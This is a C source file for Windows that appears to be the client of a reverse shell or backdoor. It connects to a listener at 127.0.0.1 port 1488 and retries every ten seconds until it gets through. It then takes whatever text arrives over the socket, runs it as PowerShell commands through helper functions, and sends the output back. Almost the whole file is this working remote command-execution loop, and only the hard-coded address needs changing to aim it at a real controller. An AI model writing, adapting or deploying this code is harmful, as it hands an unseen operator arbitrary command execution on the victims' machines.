#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include <windows.h>

#include "commandmanager.h"

#define MAX_SIZE 200000

int main()
{
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    WSADATA ws;
    WSAStartup(MAKEWORD(2, 2), &ws);

    SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);

    SOCKADDR_IN sai;
    memset(&sai, 0, sizeof(sai));
    sai.sin_family = AF_INET;
    sai.sin_port = htons(1488);

    sai.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    
    int result;
    while ((result = connect(
        soc, (const struct sockaddr *) &sai, sizeof(sai))) != 0)
        {
            wprintf(L"Cannot connect WSAE: %d, result: %d, LastError %d\n", WSAGetLastError(), result, GetLastError());
            Sleep(10000);
        }
    

    wchar_t dataw[MAX_SIZE];
    unsigned char datac[MAX_SIZE];
    int written_bytes = 0;

    memset(dataw, 0, sizeof(dataw));
    memset(datac, 0, sizeof(datac));

    int reciered;
    int sended;
    while ((reciered = recv(soc, datac, sizeof(datac), 0)) > 0)
    {     
        int nibites = MultiByteToWideChar(CP_UTF8, 0, datac, -1, NULL, 0);
            int iconverted = MultiByteToWideChar(
                CP_UTF8, 0, datac, -1, dataw, nibites);
        to_powershell_command(dataw);
        execute_powershell_command(dataw, datac, &written_bytes);
        Sleep(1000);
        
        sended = send(soc, datac, written_bytes, 0);
        wprintf(L"Send return: %d, WSAE: %d, last erorr: %d\n", sended, WSAGetLastError(), GetLastError());
    }
    
    return 0;
}
